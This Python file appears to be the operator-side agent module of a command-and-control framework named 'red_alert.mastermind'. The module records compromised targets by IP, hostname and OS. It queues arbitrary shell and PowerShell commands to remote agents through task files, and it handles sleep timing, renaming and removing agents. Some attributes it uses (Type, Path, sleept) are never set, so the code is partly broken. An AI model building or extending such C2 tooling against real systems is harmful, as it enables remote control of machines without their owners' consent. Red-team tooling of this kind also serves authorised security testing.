#!/usr/bin/python3
import os
import time
import red_alert.mastermind.core.menu as men
from .common import *

from shutil import rmtree


class Agent:
    def __init__(self, listener_name, uuid, tgt_ip, tgt_hostname, tgt_os, tgt_version):
        self.listener_name = listener_name
        self.name = uuid
        self.tgt_ip = tgt_ip
        self.tgt_hostname = tgt_hostname
        self.tgt_os = tgt_os
        self.tgt_version = tgt_version
        self.path = f"../data/listeners/{self.listener_name}/agents/{self.name}/"
        self.tasksPath = "{}tasks".format(self.path, self.name)

        if not os.path.exists(self.path):
            os.mkdir(self.path)

        self.menu = men.Menu(self.name)
        
        self.menu.registerCommand("shell", "Execute a shell command.", "<command>")
        self.menu.registerCommand("powershell", "Execute a powershell command.", "<command>")
        self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
        self.menu.registerCommand("clear", "Clear tasks.", "")
        self.menu.registerCommand("quit", "Task agent to quit.", "")

        self.menu.uCommands()

        self.Commands = self.menu.Commands

    
    def writeTask(self, task):

        if self.Type == "p":
            task = "VALID " + task
            # task = ENCRYPT(task, self.key)
        elif self.Type == "w":
            task = task

        with open(self.tasksPath, "w") as f:
            f.write(task)

    def clearTasks(self):

        if os.path.exists(self.tasksPath):
            os.remove(self.tasksPath)
        else:
            pass

    # def update(self):
        
    #     self.menu.name = self.name
    #     self.Path      = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
    #     self.tasksPath = "{}tasks".format(self.Path, self.name)
        
    #     if os.path.exists(self.Path) == False:
    #         os.mkdir(self.Path)
        
    def rename(self, newname):
        
        task    = "rename " + newname
        self.writeTask(task)
        
        progress("Waiting for agent.")
        while os.path.exists(self.tasksPath):
            pass
        
        return 0

    def shell(self, args):

        if len(args) == 0:
            error("Missing command.")
        else:
            command = " ".join(args)
            task    = "shell " + command
            self.writeTask(task)

    def powershell(self, args):
        
        if len(args) == 0:
            error("Missing command.")
        else:
            command = " ".join(args)
            task    = "powershell " + command
            self.writeTask(task)

    def sleep(self, args):

        if len(args) != 1:
            error("Invalid arguments.")
        else:
            time = args[0]

            try:
                temp = int(time)
            except:
                error("Invalid time.")
                return 0
            
            task = "sleep {}".format(time)
            self.writeTask(task)
            self.sleept = int(time)
            removeFromDatabase(agentsDB, self.name)
            writeToDatabase(agentsDB, self)

    def QuitandRemove(self):

        self.Quit()

        rmtree(self.Path)
        # removeFromDatabase(agentsDB,self.name)

        men.Menu.home()
        
        return 0

    def Quit(self):
        
        self.writeTask("quit")

        progress("Waiting for agent.")

        for i in range(self.sleept):
            
            if os.path.exists(self.tasksPath):
                time.sleep(1)
            else:
                break

        return 0

    def ev(self, command, args):

        if command == "help":
            self.menu.showHelp()
        elif command == "home":
            men.Menu.home()
        elif command == "exit":
            men.Menu.Exit()
        elif command == "shell":
            self.shell(args)
        elif command == "powershell":
            self.powershell(args)
        elif command == "sleep":
            self.sleep(args)
        elif command == "clear":
            self.clearTasks()
        elif command == "quit":
            self.QuitandRemove()

    def interact(self):

        self.menu.clearScreen()

        while True:
            
            try:
                command, args = self.menu.parse()
            except:
                continue
            
            if command not in self.Commands:
                error("Invalid command.")
            else:
                self.ev(command, args)